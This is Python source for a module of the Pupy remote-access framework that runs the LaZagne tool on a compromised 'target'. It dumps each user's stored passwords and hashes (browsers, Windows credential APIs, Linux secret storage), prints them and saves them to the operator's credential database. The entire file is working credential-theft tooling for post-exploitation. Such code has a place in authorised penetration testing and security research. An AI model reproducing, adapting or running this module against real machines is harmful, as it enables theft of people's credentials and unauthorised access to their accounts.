# -*- coding: utf-8 -*-
# Author: AlessandroZ

from pupylib.PupyModule import *
from pupylib.PupyCompleter import *
from rpyc.utils.classic import upload
from pupylib.utils.credentials import Credentials
from pupylib.utils.term import colorize
import tempfile
import subprocess
import os.path
import sys

__class_name__="LaZagne"

@config(cat="creds", compat=["linux", "windows"])
class LaZagne(PupyModule):
    """
        retrieve passwords stored on the target
    """

    dependencies = {
        'all': [ 'sqlite3', '_sqlite3', 'xml', '_elementtree',
                     'calendar', 'xml', 'xml.etree', 'colorama',
                     'memorpy', 'ConfigParser', 'Crypto.Util.asn1', 'Crypto.PublicKey', 'lazagne', 'laZagne'],
        'windows': [ 'sqlite3.dll', 'win32crypt', 'win32api', 'win32con', 'win32cred',
                         'impacket', 'win32security', 'win32net', 'pyexpat', 'gzip' ],
        'linux': [ 'secretstorage' ]
    }

    def init_argparse(self):
        header = '|====================================================================|\n'
        header += '|                                                                    |\n'
        header += '|                        The LaZagne Project                         |\n'
        header += '|                                                                    |\n'
        header += '|                          ! BANG BANG !                             |\n'
        header += '|                                                                    |\n'
        header += '|====================================================================|\n\n'

        self.arg_parser = PupyArgumentParser(prog="lazagne", description=header + self.__doc__)

    def run(self, args):
        db = Credentials(
            client=self.client.short_name(), config=self.config
        )

        first_user = True
        passwordsFound = False
        for r in self.client.conn.modules["laZagne"].runLaZagne():

            if r[0] == 'User':
                if not passwordsFound and not first_user:
                    self.warning("no passwords found !")

                first_user = False
                passwordsFound = False
                print colorize('\n########## User: %s ##########' % r[1].encode('utf-8', errors='replace'), "yellow")

            elif r[2]:
                # Fix false positive with keepass
                # Remove 'Get-Process' dict
                [r[2][i].pop('Get-Process', None) for i in range(0, len(r[2]))]
                # Remove empty value
                r = (r[0], r[1], [i for i in r[2] if i])

                if r[2]:
                    self.print_module_title(r[1])
                    passwordsFound = True
                    self.print_results(r[0], r[1], r[2], db)

        # print passwordsFound
        if not passwordsFound:
            self.warning("no passwords found !")

    def print_module_title(self, module):
        print colorize("\n------------------- %s passwords -------------------\n" % module.encode('utf-8', errors="replace"), "yellow")

    def print_results(self, success, module, creds, db):
        # print colorize("\n------------------- %s passwords -------------------\n" % module.encode('utf-8', errors="replace"), "yellow")
        if success:
            clean_creds = []
            for cred in creds:
                clean_cred = {}
                clean_cred['Category'] = '%s' % module
                for c in cred.keys():
                    credvalue = cred[c]
                    if not type(credvalue) in (unicode, str):
                        credvalue = str(credvalue)
                    else:
                        try:
                            credvalue = credvalue.strip().decode('utf-8')
                        except:
                            credvalue = credvalue.strip()

                    clean_cred[c] = credvalue
                    try:
                        print u'%s: %s' % (c, clean_cred[c].encode('utf-8', errors="replace"))
                    except:
                        print u'%s: %s' % (c, clean_cred[c])

                    if c == "Password":
                        clean_cred['CredType'] = 'plaintext'
                    elif c == 'Hash':
                        clean_cred['CredType'] = 'hash'
                print

                # manage when no password found
                if 'CredType' not in clean_cred:
                    clean_cred['CredType'] = 'empty'
                clean_creds.append(clean_cred)

            try:
                db.add(clean_creds)
                self.success("Passwords stored on the database")
            except Exception, e:
                print e
        else:
            # contains a stacktrace
            self.error(str(creds))
